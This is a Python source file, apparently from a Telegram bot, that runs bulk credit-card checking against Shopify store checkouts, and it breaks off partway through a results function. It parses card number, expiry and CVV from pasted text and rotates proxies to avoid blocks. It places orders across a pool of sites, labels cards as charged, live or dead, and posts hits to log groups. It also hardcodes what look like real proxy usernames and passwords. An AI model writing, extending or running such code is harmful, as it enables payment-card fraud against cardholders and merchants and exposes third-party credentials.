import sys
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def _safe_print(*args, **kwargs):
    try:
        sys.stdout.write(" ".join(str(a) for a in args) + kwargs.get("end", "\n"))
        sys.stdout.flush()
    except Exception:
        pass

print = _safe_print

import asyncio
import aiohttp
import threading as _threading
import random
import re
import logging
import time
import string
import psycopg2.extras
import os
import html as _html_mod
from datetime import datetime
from typing import Optional, Tuple, List
from io import BytesIO
from collections import deque
from html import escape as html_escape

from aiogram import types, F, Router, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from utils_send import safe_send_message, safe_send_animation
from aiogram.filters.callback_data import CallbackData

from database import is_gate_enabled, update_user_stats, get_db_connection, get_user_sites_db
from bin import get_bin_info
from sub import get_premium_status

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ADMIN_IDS = {6962534443, 8761005192, 8428369446}

CUSTOM_CHARGED_EMOJI_ID = "5343636681473935403"
CUSTOM_APPROVED_EMOJI_ID = "5039844895779455925"
CUSTOM_DECLINED_EMOJI_ID = "4915853119839011973"

BTN_CHARGED_EMOJI_ID = "5343636681473935403"
BTN_DEAD_EMOJI_ID = "4915853119839011973"
BTN_LIVE_EMOJI_ID = "5039844895779455925"
BTN_STOP_EMOJI_ID = "5040042498634810056"
BTN_ALL_EMOJI_ID = "5447602197439218445"

HIT_CHARGED_EMOJI_ID = "5188487846968732572"
HIT_USER_EMOJI_ID    = "5201873447554145566"
HIT_WARNING_EMOJI_ID = "4915853119839011973"
HIT_BLOCKED_EMOJI_ID = "5040030395416969985"
HIT_GATE_EMOJI_ID    = "5039895103947146186"
HIT_FIRE_EMOJI_ID    = "5436113877181941026"
HIT_CARD_EMOJI_ID    = "5039623284056917259"
HIT_CHART_EMOJI_ID   = "5231200819986047254"
HIT_BOLT_EMOJI_ID    = "5456140674028019486"
HIT_DEV_EMOJI_ID     = "5039653765439816618"

HIT_LOG_GROUP_ID = -1004384293344
EXTRA_CHARGED_GROUP_IDS = [-5447284969]

BUTTON_LOCK_SECONDS = 30

MAX_OUTER_ROUNDS = int(os.environ.get("MAX_OUTER_ROUNDS", 4))
OUTER_RETRY_DELAYS = [
    int(os.environ.get("RETRY_DELAY_1", 90)),
    int(os.environ.get("RETRY_DELAY_2", 180)),
    int(os.environ.get("RETRY_DELAY_3", 300)),
    int(os.environ.get("RETRY_DELAY_4", 300)),
]

MAX_PROXY_RETRIES = int(os.environ.get("MAX_PROXY_RETRIES", 8))
MAX_SITE_RETRIES  = int(os.environ.get("MAX_SITE_RETRIES", 8))

# Lowered 15 → 10. Each concurrent card holds an open API call plus a
# BIN-lookup task. 10 cards × 4 API replicas ≈ 2.5 per replica ≈ 250 MB
# peak per replica — safe on Railway Hobby's 512 MB even if the env var
# is never set.
CARD_CONCURRENCY  = int(os.environ.get("CARD_CONCURRENCY", 10))

MAX_FALLBACKS = 3
SITE_COOLDOWN_TTL = 90
POOL_EXHAUSTED_MAX_INNER = 1
POOL_EXHAUSTED_INNER_DELAY = 8.0
SITE_CONCURRENCY_LIMIT = int(os.environ.get("SITE_CONCURRENCY_LIMIT", 5))
API_ATTEMPTS = 1
API_TIMEOUT = 14.0

MAX_SATURATION_WAITS = int(os.environ.get("MAX_SATURATION_WAITS", 50))
MAX_API_BACKOFF_WAITS = int(os.environ.get("MAX_API_BACKOFF_WAITS", 4))
API_BACKOFF_BASE = float(os.environ.get("API_BACKOFF_BASE", 2.0))

# PATCH P2: NO_SELLER_PROPOSAL gets its own budget (50) so cards don't
# die after 8 address rejections — ~40% of sites return it and the 8-cap
# kills 1-in-160 cards purely from address mismatch.
MAX_NO_SELLER_HITS = int(os.environ.get("MAX_NO_SELLER_HITS", 50))

# PATCH P1: how long to locally cooldown a proxy the API reports as
# "dead/in cooldown". Short so the two trackers stay roughly in sync.
API_COOLDOWN_MIRROR_SECONDS = int(os.environ.get("API_COOLDOWN_MIRROR_SECONDS", 30))

PROXY_ERROR_CODES = {"PROXY_ERROR"}
_ALL_COOLED_SENTINEL = "__ALL_COOLED__"

SKIP_SITE_CODES = {
    "NO_PRODUCT", "NO_PRODUCT_FOUND", "PRICE_TOO_HIGH", "PRICE_OVER_MAX",
    "SITE_REQUIRES_LOGIN", "NO_SHOPIFY_PAYMENTS_GATEWAY", "THROTTLED",
    "CAPTCHA_REQUIRED",
}

SITE_ERROR_CODES = {
    "CHECKOUT_FAILED", "CART_FAILED", "GRAPHQL_ERROR", "SITE_ERROR",
    "SESSION_EXPIRED", "NEGOTIATE_FAILED", "NO_SESSION_TOKEN",
    "NO_ATTEMPT_TOKEN", "NO_SELLER_PROPOSAL", "CHECKPOINTDENIED",
    "SUBMIT_FAILED", "TOKENIZATION_FAILED", "ORDER_CREATION_FAILED",
    "NO_PAYMENT_REQUIRED",
    "TIMEOUT",
}

POOL_EXHAUSTED_CODES = {"SITES_EXHAUSTED", "Pool Exhausted"}
CHARGED_CODES = {"ORDER_PLACED"}
APPROVED_CODES = {
    "INSUFFICIENT_FUNDS", "INVALID_CVC", "INCORRECT_CVC",
    "3DS_REQUIRED", "OTP_REQUIRED", "AUTHENTICATION_REQUIRED",
    "ACTION_REQUIRED", "INCORRECT_ZIP", "AVS_FAILED",
    "BILLING_ADDRESS_MISMATCH", "INVALID_CVV", "CVC_DECLINED",
}
INSUFFICIENT_CODES = {"INSUFFICIENT_FUNDS"}
DEAD_CODES = {
    "CARD_DECLINED", "EXPIRED_CARD", "INVALID_CARD",
    "FRAUD_SUSPECTED", "DO_NOT_HONOR", "PICK_UP_CARD",
    "RESTRICTED_CARD", "STOLEN_CARD", "LOST_CARD",
    "AMOUNT_TOO_SMALL", "TEST_MODE_LIVE_CARD", "DECISION_RULE_BLOCK",
    "PROCESSING_ERROR", "GENERIC_DECLINE", "INVALID_PURCHASE_TYPE",
    "INVALID_PAYMENT_METHOD", "INCORRECT_NUMBER", "INVALID_ACCOUNT",
}

DECLINE_HINTS = ("DECLINED", "DECLINE", "REJECTED", "NOT_ALLOWED",
                 "UNAVAILABLE", "PAYMENT_METHOD_REJECTED")

MSH_SESSIONS = {}
SESSION_LOCKS = {}

_MSH_HTTP_SESSION = None


def _get_msh_http_session():
    global _MSH_HTTP_SESSION
    if _MSH_HTTP_SESSION is None or _MSH_HTTP_SESSION.closed:
        _MSH_HTTP_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=60),
            connector=aiohttp.TCPConnector(
                limit=2000,
                limit_per_host=2000,
                ttl_dns_cache=300,
                ssl=False,
            ),
        )
    return _MSH_HTTP_SESSION

_MSH_SESSION_MAX_AGE = 3600


def _site_available(site: str, session: dict) -> bool:
    now = time.time()
    bl = session.get('_blacklisted_sites') or {}
    np = session.get('_no_product_sites') or {}
    return bl.get(site, 0) <= now and np.get(site, 0) <= now


def _cleanup_site_cooldowns(session: dict) -> None:
    now = time.time()
    session['_blacklisted_sites'] = {
        k: v for k, v in (session.get('_blacklisted_sites') or {}).items() if v > now
    }
    session['_no_product_sites'] = {
        k: v for k, v in (session.get('_no_product_sites') or {}).items() if v > now
    }


async def _safe_bin_lookup(cc_num: str) -> dict:
    def _sync():
        try:
            r = get_bin_info(cc_num)
            return r if isinstance(r, dict) else {}
        except Exception:
            return {}

    try:
        if asyncio.iscoroutinefunction(get_bin_info):
            res = await asyncio.wait_for(get_bin_info(cc_num), timeout=4.0)
        else:
            res = await asyncio.wait_for(asyncio.to_thread(_sync), timeout=4.0)

        if asyncio.iscoroutine(res):
            res = await asyncio.wait_for(res, timeout=4.0)
        return res if isinstance(res, dict) else {}
    except Exception:
        return {}


def _cleanup_msh_sessions():
    import time as _t
    cutoff = _t.time() - _MSH_SESSION_MAX_AGE
    dead = [sid for sid, s in list(MSH_SESSIONS.items())
            if s.get('status') in ('FINISHED', 'STOPPED') and s.get('start_time', 0) < cutoff]
    for sid in dead:
        MSH_SESSIONS.pop(sid, None)
        SESSION_LOCKS.pop(sid, None)

def _start_msh_gc():
    import time as _t
    def _loop():
        while True:
            _t.sleep(600)
            try: _cleanup_msh_sessions()
            except Exception: pass
    _threading.Thread(target=_loop, daemon=True, name='msh_gc').start()

_start_msh_gc()


router = Router()

try:
    from shopify_api import (
        get_active_server, SHOPIFY_API_KEY, ALT_API_KEY, API_SERVERS,
        check_shopify_card,
    )
except ImportError:
    import sys
    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from shopify_api import (
        get_active_server, SHOPIFY_API_KEY, ALT_API_KEY, API_SERVERS,
        check_shopify_card,
    )


_BLACKLIST_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "blacklisted_sites.txt")

def _load_blacklist():
    if os.path.exists(_BLACKLIST_FILE):
        with open(_BLACKLIST_FILE, "r", encoding="utf-8", errors="ignore") as f:
            return set(line.strip() for line in f if line.strip())
    return set()

def _save_to_blacklist(site):
    with open(_BLACKLIST_FILE, "a", encoding="utf-8") as f:
        f.write(site.strip() + "\n")

GLOBAL_BLACKLISTED_SITES = _load_blacklist()


def _strip_html_and_tg_emoji(text: str) -> str:
    if not text:
        return ""
    text = re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', text, flags=re.DOTALL)
    text = re.sub(r'<[^>]+>', '', text)
    text = _html_mod.unescape(text)
    return text


async def _is_group(bot, chat_id: int) -> bool:
    try:
        chat = await bot.get_chat(chat_id)
        return chat.type in ("group", "supergroup")
    except Exception as e:
        logging.warning(f"[MSH] _is_group({chat_id}) lookup failed: {e}")
        return False


async def _safe_send_document(bot, chat_id, document_bytes, filename, caption, reply_to=None):
    try:
        await bot.send_document(
            chat_id=chat_id,
            document=BufferedInputFile(file=document_bytes, filename=filename),
            caption=caption,
            parse_mode="HTML",
            reply_to_message_id=reply_to,
        )
        return True
    except TelegramBadRequest as e:
        err_lower = str(e).lower()
        logging.warning(f"[_safe_send_document] attempt 1 failed: {e}")
        if ("reply" in err_lower and "not found" in err_lower) or ("message to reply" in err_lower):
            try:
                await bot.send_document(
                    chat_id=chat_id,
                    document=BufferedInputFile(file=document_bytes, filename=filename),
                    caption=caption, parse_mode="HTML",
                )
                return True
            except TelegramBadRequest as e2:
                logging.warning(f"[_safe_send_document] attempt 2 failed: {e2}")
            except Exception as e2:
                logging.error(f"[_safe_send_document] attempt 2 unexpected: {e2}")
    except Exception as e:
        logging.error(f"[_safe_send_document] attempt 1 unexpected: {e}")
    plain_caption = _strip_html_and_tg_emoji(caption)
    try:
        await bot.send_document(
            chat_id=chat_id,
            document=BufferedInputFile(file=document_bytes, filename=filename),
            caption=plain_caption,
        )
        return True
    except Exception as e3:
        logging.error(f"[_safe_send_document] plain-text fallback failed: {e3}")
        return False


async def _safe_send_animation_or_text(bot, chat_id, caption, gif_url=None, reply_markup=None):
    if gif_url:
        try:
            await safe_send_animation(
                bot, chat_id=chat_id, animation=gif_url,
                caption=caption, parse_mode="HTML", reply_markup=reply_markup,
            )
            return True
        except Exception as e:
            logging.warning(f"[_safe_send] animation failed: {e}")
    try:
        await safe_send_message(
            bot, chat_id=chat_id, text=caption,
            parse_mode="HTML", reply_markup=reply_markup,
        )
        return True
    except Exception as e:
        logging.warning(f"[_safe_send] HTML text failed: {e}")
    plain = _strip_html_and_tg_emoji(caption)
    try:
        await safe_send_message(bot, chat_id=chat_id, text=plain, reply_markup=reply_markup)
        return True
    except Exception as e:
        logging.error(f"[_safe_send] plain text failed: {e}")
        return False


class MshResultCallback(CallbackData, prefix="mshr"):
    session_id: str
    result_type: str

class MshStopCallback(CallbackData, prefix="mshs"):
    session_id: str


class ProxyManager:
    SUCCESS_RESPONSES = [
        'CARD_DECLINED', 'ORDER_PLACED', 'CHARGED', 'APPROVED',
        'INSUFFICIENT_FUNDS', 'INVALID_CVC', 'INCORRECT_CVC',
        '3DS_REQUIRED', 'FRAUD_SUSPECTED', 'GENERIC_ERROR',
        'DO_NOT_HONOR', 'EXPIRED_CARD',
        'INCORRECT_ZIP', 'STOLEN_CARD', 'LOST_CARD',
        'INCORRECT_NUMBER', 'AMOUNT_TOO_SMALL',
        'TRANSACTION_NOT_ALLOWED', 'RESTRICTED_CARD'
    ]
    PROXY_ERROR_PATTERNS = [
        'connection error', 'connection refused', 'connection reset',
        'connect timeout',
        'could not resolve host', 'dns error', 'name resolution',
        'proxy authentication', 'auth failed', '407',
        'tunnel failed', 'socks error', 'ssl error',
        'network unreachable', 'host unreachable',
        'connection aborted', 'broken pipe', 'socket error',
        'too many redirects', 'redirect loop',
        'ECONNREFUSED', 'ECONNRESET', 'ETIMEDOUT', 'ENOTFOUND',
        'proxy error', 'bad gateway', 'empty psk', 'pasted_fields', '<b>Proxy Dead!</b>',
        'tokenization blocked: 403 Forbidden (proxy/IP blocked)'
    ]

    def __init__(self, proxies_list: List[str], session_id: str):
        self.session_id = session_id
        self.raw_proxies = list(set(proxies_list))
        self.all_proxies = [self._normalize_proxy(p) for p in self.raw_proxies]
        self.all_proxies = [p for p in self.all_proxies if p]
        self.proxy_queue = deque(self.all_proxies)
        self.failed_proxies = {}
        self.success_counts = {proxy: 0 for proxy in self.all_proxies}
        self.total_uses = 0
        self.cooldown_seconds = 60
        dropped = len(self.raw_proxies) - len(self.all_proxies)
        logging.info(f"[ProxyManager] Initialized with {len(self.all_proxies)} normalized proxies for session {session_id}" + (f" (dropped {dropped} malformed)" if dropped else ""))

    def _normalize_proxy(self, proxy: str) -> Optional[str]:
        if not proxy or not proxy.strip():
            return None
        p = proxy.strip()
        if p.startswith(("http://", "https://")) and "@" in p and ":" in p.rsplit("@", 1)[1]:
            return p
        if p.startswith("socks5://"):
            return "http://" + p[9:]
        parts = p.split()
        if len(parts) == 4 and parts[3].isdigit():
            u, pw, h, port = parts
            return f"http://{u}:{pw}@{h}:{port}"
        if len(parts) == 2 and parts[1].isdigit():
            return f"http://{parts[0]}:{parts[1]}"
        if "@" in p and ":" in p.split("@", 1)[0]:
            return f"http://{p}"
        logging.warning(f"[ProxyManager] Dropping unrecognisable proxy: {p[:60]!r}")
        return None

    def get_next_proxy(self) -> Optional[Tuple[str, bool]]:
        if not self.all_proxies:
            return None, False
        current_time = time.time()
        attempts = 0
        max_attempts = len(self.all_proxies) * 2
        while attempts < max_attempts:
            if not self.proxy_queue:
                self.proxy_queue = deque(self.all_proxies)
            proxy = self.proxy_queue.popleft()
            if proxy in self.failed_proxies:
                fail_data = self.failed_proxies[proxy]
                cooldown_until = fail_data.get('cooldown_until', 0)
                if current_time < cooldown_until:
                    self.proxy_queue.append(proxy)
                    attempts += 1
                    continue
                else:
                    del self.failed_proxies[proxy]
            self.proxy_queue.append(proxy)
            self.total_uses += 1
            return proxy, True
        if self.failed_proxies:
            return _ALL_COOLED_SENTINEL, True
        return None, False

    def report_success(self, proxy: str):
        if proxy in self.success_counts:
            self.success_counts[proxy] += 1
        else:
            self.success_counts[proxy] = 1
        if proxy in self.failed_proxies:
            del self.failed_proxies[proxy]

    # PATCH P1: mark a proxy as cooling for a SHORT fixed window without
    # touching fail_count or applying exponential backoff. Called when
    # api.py returns "dead/in cooldown" — that's the API's own cooldown
    # state, not a fresh failure. Without this the proxy is never
    # re-marked in OUR pool, get_next_proxy() keeps returning it, and
    # the card spins in an infinite rotate loop.
    def mirror_api_cooldown(self, proxy: str, seconds: float = None):
        if proxy in self.failed_proxies:
            return
        now = time.time()
        self.failed_proxies[proxy] = {
            'fail_count': 1,
            'first_fail': now,
            'last_fail': now,
            'cooldown_until': now + (seconds if seconds is not None else API_COOLDOWN_MIRROR_SECONDS),
        }

    def is_real_proxy_error(self, api_response: str, http_status: Optional[int] = None) -> bool:
        response_lower = api_response.lower() if api_response else ''

        if "dead/in cooldown" in response_lower:
            return False

        if "proxy_error" in response_lower or "proxy error" in response_lower:
            return True
        for success_indicator in self.SUCCESS_RESPONSES:
            if success_indicator.lower() in response_lower:
                return False
        if '429' in response_lower or 'too many requests' in response_lower:
            return False
        if any(x in response_lower for x in ['no available products', 'not shopify', 'site requires login']):
            return False
        if 'step ' in response_lower and ('failed' in response_lower or 'error' in response_lower):
            return False
        if any(x in response_lower for x in ['receipt', 'could not extract', 'missing']):
            return False
        if http_status and http_status in [200, 201, 400, 401, 402, 403, 422, 500]:
            return False
        for error_pattern in self.PROXY_ERROR_PATTERNS:
            if error_pattern in response_lower:
                return True
        return False

    def report_result(self, proxy: str, api_response: str, http_status: Optional[int] = None):
        current_time = time.time()
        if self.is_real_proxy_error(api_response, http_status):
            if proxy not in self.failed_proxies:
                self.failed_proxies[proxy] = {'fail_count': 0, 'first_fail': current_time,
                                              'last_fail': current_time, 'cooldown_until': 0}
            fail_data = self.failed_proxies[proxy]
            fail_data['fail_count'] += 1
            fail_data['last_fail'] = current_time
            fail_count = fail_data['fail_count']
            cooldown_multipliers = [30, 60, 120, 300, 600, 900, 1800]
            multiplier_index = min(fail_count - 1, len(cooldown_multipliers) - 1)
            cooldown_duration = cooldown_multipliers[multiplier_index]
            fail_data['cooldown_until'] = current_time + cooldown_duration
            logging.debug(f"[ProxyManager] Proxy FAILED: {mask_proxy(proxy)} (#{fail_count}) "
                          f"Cooldown: {cooldown_duration}s | {api_response[:80]}")
        else:
            self.report_success(proxy)

    def get_stats(self) -> dict:
        active_count = len([p for p in self.all_proxies if p not in self.failed_proxies])
        return {
            'total_proxies': len(self.all_proxies),
            'active': active_count,
            'failed': len(self.failed_proxies),
            'total_uses': self.total_uses,
            'success_distribution': dict(self.success_counts)
        }

    def get_available_count(self) -> int:
        current_time = time.time()
        available = 0
        for proxy in self.all_proxies:
            if proxy in self.failed_proxies:
                if current_time >= self.failed_proxies[proxy].get('cooldown_until', 0):
                    available += 1
            else:
                available += 1
        return available


def mask_proxy(proxy: str) -> str:
    try:
        if '@' in proxy:
            parts = proxy.split('@')
            if len(parts) == 2:
                return f"***@{parts[1]}"
        return proxy[:15] + "***" if len(proxy) > 15 else "***"
    except:
        return "***"

def build_user_link(user_obj) -> str:
    name = html_escape(user_obj.first_name or "User")
    if user_obj.username:
        return f'<a href="https://t.me/{html_escape(user_obj.username)}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'


def extract_cards_from_text(text: str) -> List[str]:
    patterns = [
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s\|\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s(\d{1,2})\/(\d{2,4})\s(\d{3,4})',
    ]
    cards = []
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            if len(match) == 4:
                card_number, month, year, cvv = match
                month = month.zfill(2)
                if len(year) == 4:
                    year = year[2:]
                card_string = f"{card_number}|{month}|{year}|{cvv}"
                if card_string not in cards:
                    cards.append(card_string)
    return cards


def log_hit_to_mshh(user_id, username, first_name):
    try:
        with open("mshh.txt", "a", encoding="utf-8") as f:
            u_name = username if username else "None"
            f_name = first_name if first_name else "Unknown"
            f.write(f"{user_id}|{u_name}|{f_name}\n")
    except Exception as e:
        logging.error(f"Error writing to mshh.txt: {e}")


FINAL_GOOD_RESPONSES = frozenset({
    "CARD_DECLINED", "INSUFFICIENT_FUNDS", "INVALID_CVC",
    "3DS_REQUIRED", "OTP_REQUIRED", "EXPIRED_CARD",
    "INVALID_CARD", "STOLEN_CARD", "LOST_CARD",
    "RESTRICTED_CARD", "FRAUD_SUSPECTED", "DO_NOT_HONOR",
    "PICK_UP_CARD", "TEST_MODE_LIVE_CARD", "DECISION_RULE_BLOCK",
    "AMOUNT_TOO_SMALL", "INCORRECT_NUMBER", "INVALID_PURCHASE_TYPE",
    "INVALID_PAYMENT_METHOD", "PROCESSING_ERROR", "GENERIC_DECLINE",
})
FINAL_SITE_REJECTIONS = frozenset({
    "NO_PRODUCT", "PRICE_TOO_HIGH", "NO_PRODUCT_FOUND",
    "NO_SHOPIFY_PAYMENTS_GATEWAY", "SITE_REQUIRES_LOGIN",
    "All sites permanently blacklisted",
    "No sites with products available",
    "All proxies exhausted",
    "All sites exhausted",
    "Sites exhausted",
    "No proxies configured",
    "Site pool saturated",
    "All sites address-rejected",
})
RETRYABLE_ERRORS = frozenset({
    "THROTTLED", "TIMEOUT", "PROXY_ERROR", "SITE_ERROR",
    "GRAPHQL_ERROR", "NO_SESSION_TOKEN", "NO_SELLER_PROPOSAL",
    "NEGOTIATE_FAILED", "CHECKOUT_FAILED", "CART_FAILED",
    "TOKENIZATION_FAILED", "CHECKPOINTDENIED", "SESSION_EXPIRED",
    "SUBMIT_FAILED", "ORDER_CREATION_FAILED", "NO_PAYMENT_REQUIRED",
    "API_REPLICAS_UNREACHABLE", "Pool Exhausted", "CAPTCHA_REQUIRED",
})


def _classify_for_retry(response_msg: str) -> str:
    if not response_msg:
        return "RETRYABLE"
    msg = str(response_msg).strip()
    for prefix in FINAL_SITE_REJECTIONS:
        if prefix in msg:
            return "FINAL_REJECT"
    for prefix in FINAL_GOOD_RESPONSES:
        if msg.startswith(prefix):
            return "FINAL_GOOD"
    for prefix in RETRYABLE_ERRORS:
        if prefix in msg:
            return "RETRYABLE"
    return "RETRYABLE"


def _extract_code(message: str) -> str:
    if not message:
        return ""
    return message.upper().split(" - ")[0].split(":")[0].strip()


def is_session_stopped(session_id: str) -> bool:
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return True
    return session.get('status') == "STOPPED"


async def get_anime_gif():
    REACTIONS = ["airkiss", "blush", "brofist", "celebrate", "cheers", "clap",
                 "cool", "cuddle", "dance", "handhold", "happy", "hug",
                 "kiss", "laugh", "lick", "love", "nervous", "nom",
                 "nuzzle", "nyah", "pat", "peek", "shy", "sip",
                 "sleep", "smile", "smug", "sorry", "thumbsup",
                 "tickle", "tired", "wave", "wink", "yay", "yes"]
    reaction = random.choice(REACTIONS)
    api_url = f"https://api.otakugifs.xyz/gif?reaction={reaction}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data.get("url")
    except Exception as e:
        logging.error(f"Error fetching anime gif: {e}")
    return "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3Z6eXF6eXF6eXF6eXF6eXF6SZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LdOyjZ7h5xS3yCjQ8I/giphy.gif"


async def get_user_plan_name(user_id):
    is_premium, _ = get_premium_status(user_id)
    if is_premium:
        try:
            def _sync_fetch():
                conn = get_db_connection()
                cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
                cursor.execute("SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1", (user_id,))
                row = cursor.fetchone()
                conn.close()
                if row:
                    p = row['plan'].lower()
                    if any(k in p for k in ["kashim", "chirag", "darkanon", "starkz"]):
                        return 'Starkz <tg-emoji emoji-id="5039727497143387500">👑</tg-emoji>'
                    if "root" in p: return '𝗥𝗼𝗼𝘁 <tg-emoji emoji-id="5039727497143387500">👑</tg-emoji>'
                    if "elite" in p: return "𝗘𝗹𝗶𝘁𝗲 <tg-emoji emoji-id='5278751923338490157'>⭐</tg-emoji>"
                    if "core" in p: return '𝗖𝗼𝗿𝗲 <tg-emoji emoji-id="5042274086332400375">🛠️</tg-emoji>'
                    return row['plan']
                return "PREMIUM"
            return await asyncio.to_thread(_sync_fetch)
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "PREMIUM"
    return "TRIAL"


DEFAULT_PROXIES = [
    "http://1351:IBd1Fk5CuUNZ@p103.squidproxies.com:9087",
    "http://1401:FVRHsSXw2DNK@p103.squidproxies.com:9238",
    "http://1439:jqvFsDEZ&%Sm@p102.squidproxies.com:9292",
    "http://1439:jqvFsDEZ&%Sm@p103.squidproxies.com:9291",
]


async def get_user_proxies(user_id):
    proxies = []
    try:
        def _sync_fetch():
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT proxy FROM proxies WHERE user_id = %s", (user_id,))
            rows = cursor.fetchall()
            conn.close()
            return [row[0] for row in rows]
        proxies = await asyncio.to_thread(_sync_fetch)
    except Exception as e:
        logging.error(f"Error fetching proxies for user {user_id}: {e}")
    if not proxies:
        proxies = DEFAULT_PROXIES[:]
    return proxies


def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    for i, char in enumerate(card_number[::-1]):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0


def is_expired(mm: str, yy: str) -> bool:
    try:
        now = datetime.now()
        cy, cm = now.year % 100, now.month
        ey, em = int(yy), int(mm)
        if ey < cy: return True
        if ey == cy and em < cm: return True
        return False
    except ValueError:
        return True


_sites_cache = {"sites": [], "loaded_at": 0.0}
_SITES_CACHE_SOFT_TTL = 60
_SITES_CACHE_HARD_TTL = 900


def get_sites():
    global _sites_cache
    now = time.time()
    age = now - _sites_cache["loaded_at"]
    if _sites_cache["sites"] and age < _SITES_CACHE_SOFT_TTL:
        return _sites_cache["sites"]

    sites: list = []

    try:
        from database import get_global_sites
        sites = get_global_sites() or []
        if sites:
            sites = list(dict.fromkeys(sites))
            _sites_cache = {"sites": sites, "loaded_at": now}
            logging.info(f"[MSH] Loaded {len(sites)} unique sites from MongoDB")
            return sites
    except Exception as e:
        logging.error(f"[MSH] Error loading global_sites: {e}")

    if _sites_cache["sites"] and age < _SITES_CACHE_HARD_TTL:
        logging.warning(f"[MSH] DB empty — using {age:.0f}s-old cache ({len(_sites_cache['sites'])} sites)")
        return _sites_cache["sites"]

    try:
        sites_file = os.path.join(os.path.dirname(__file__), "sites.txt")
        if os.path.exists(sites_file):
            with open(sites_file, "r", encoding="utf-8", errors="ignore") as f:
                sites = [line.strip() for line in f if line.strip()]
    except Exception as e:
        logging.error(f"[MSH] Error reading sites.txt: {e}")

    if sites:
        try:
            banned_file = os.path.join(os.path.dirname(__file__), "banned_sites.json")
            if os.path.exists(banned_file):
                import json
                with open(banned_file, "r", encoding="utf-8") as bf:
                    banned = set(json.load(bf))
                    before = len(sites)
                    sites = [s for s in sites if s not in banned]
                    if len(sites) < before:
                        logging.info(f"[MSH] Filtered {before - len(sites)} banned sites")
        except Exception as e:
            logging.error(f"[MSH] Error reading banned_sites.json: {e}")

    if sites:
        sites = list(dict.fromkeys(sites))
        _sites_cache = {"sites": sites, "loaded_at": now}
        logging.warning(f"[MSH] Using sites.txt fallback ({len(sites)} unique sites)")

    return sites


def get_user_display(user_obj, plan_name):
    return f"{user_obj.first_name} ({plan_name})"


async def process_card_api(
    cc: str, mes: str, ano: str, cvv: str, site: str, proxy: str,
    fallback_sites: Optional[list] = None,
) -> Tuple[bool, str, str, str, str, str, str, int]:
    cc_formatted = f"{cc}|{mes}|{ano[-2:]}|{cvv}"
    api_proxy = (proxy or "").strip()
    if api_proxy.startswith("http://"): api_proxy = api_proxy[7:]
    elif api_proxy.startswith("https://"): api_proxy = api_proxy[8:]
    elif api_proxy.startswith("socks5://"): api_proxy = api_proxy[9:]
    try:
        _http = _get_msh_http_session()
        data = await check_shopify_card(
            site=site, cc=cc_formatted, proxy=api_proxy or None,
            session=_http,
            max_retries=1,
            timeout_sec=API_TIMEOUT,
            fallback_sites=None,
            attempts=1,
            auto=False,
        )
        api_response = data.get("Response") or data.get("Message") or "Unknown Error"
        if api_response is None: api_response = "Unknown Error"
        if not isinstance(api_response, str): api_response = str(api_response)

        msg_field = data.get("Message") or data.get("message")
        code_field = data.get("decline_code") or data.get("code")
        api_lower = api_response.lower()
        recognized = any(k in api_lower for k in
                         ["insufficient", "order_placed", "charged", "thank you",
                          "declined", "cvc", "3d", "3ds", "zip", "fraud", "amount",
                          "sites_exhausted"])
        if not recognized:
            if msg_field: api_response = f"{api_response} - {msg_field}"
            elif code_field: api_response = f"{api_response} - {code_field}"

        gateway = data.get("Gateway") or data.get("Gate") or "Shopify Payments"
        price = data.get("Price", "0.00")
        proxy_raw = data.get("Proxy", "Live")
        proxy_status = "Live" if "live" in str(proxy_raw).lower() else "Dead"
        status = data.get("Status", False)
        success = status.lower() == "true" if isinstance(status, str) else bool(status)

        return (success, api_response, site, gateway, price, "USD", proxy_status, 200)

    except asyncio.CancelledError:
        raise
    except aiohttp.ClientError as e:
        return (False, f"Connection Error: {type(e).__name__}: {str(e)[:80]}",
                site, "Shopify Payments", "0.00", "USD", "Error", None)
    except Exception as e:
        return (False, f"Error: {type(e).__name__}: {str(e)[:80]}",
                site, "Shopify Payments", "0.00", "USD", "Error", None)


def generate_result_file(session: dict, result_type: str, user_obj, plan_name: str) -> Tuple[BytesIO, str, int]:
    charged_list = session.get('charged_cards', [])
